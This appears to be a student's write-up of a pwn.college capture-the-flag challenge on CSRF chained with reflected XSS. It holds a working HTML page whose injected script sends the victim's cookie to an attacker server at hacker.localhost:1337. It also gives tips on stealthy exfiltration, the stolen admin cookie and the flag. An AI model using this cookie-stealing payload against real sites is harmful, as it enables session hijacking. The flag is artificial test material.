@@ -1,0 +1,46 @@
+# challenge: CSRF 4
+
+📅 2026-03-04
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+this time the goal is to trick the victim into sending its cookie to our server
+-ran: '/challenge/server'
+-opened a new terminal
+-ran: 'vim index.html'
+-typed: '<!DOCTYPE html>'
+        '<html>'
+                '<body>'
+                        '<script>'
+                                'const payload = "<script>fetch('http://hacker.localhost:1337/?c=' + document.cookie);</s" + "cript>";'
+                                'window.location = 'http://challenge.localhost:80/ephemeral?msg=' + encodeURIComponent(payload);'
+                        '</script>'
+                '</body>'
+        '</html>'
+-ran: 'chmod a+x index.html'
+-ran: 'python3 -m http.server 1337'
+-opened a new terminal
+-ran: '/challenge/victim'
+-checked on hacker's server logs untill i find admin's cookie: auth=admin|.QX5kzMzwCO4IDOxEzW}
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as admin-.QX5kzMzwCO4IDOxEzW}
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+the more u avoid manual url encoding in javascript, the less mental issues u will have in future
+the trick here is to use encodeURIComponent for the payload
+since some chars r not encoded as we think, for example + - = & ... the best option is to save the normal string into a constant and then encode it with encodeURIComponent
+in the second level javascript (reflected-xss in /ephemeral endpoint) u can use fetch or window.location
+best option is fetch because it is silent and not visible avoiding visible page redirection as window.location does
+u can use fetch also because SOP and SameSite r not a problem:
+-SOP -> the goal is just sending the request, not to read the response
+-SameSite -> u r not sending any cookie in the headers, u r exfiltrating cookie value from document.cookie and put it in the URL as query string
+
+## 🏁 Flag  
+pwn.college{orNSMfMZBC-ksVdVq6KYSSJbY-c.QX5kzMzwCO4IDOxEzW}
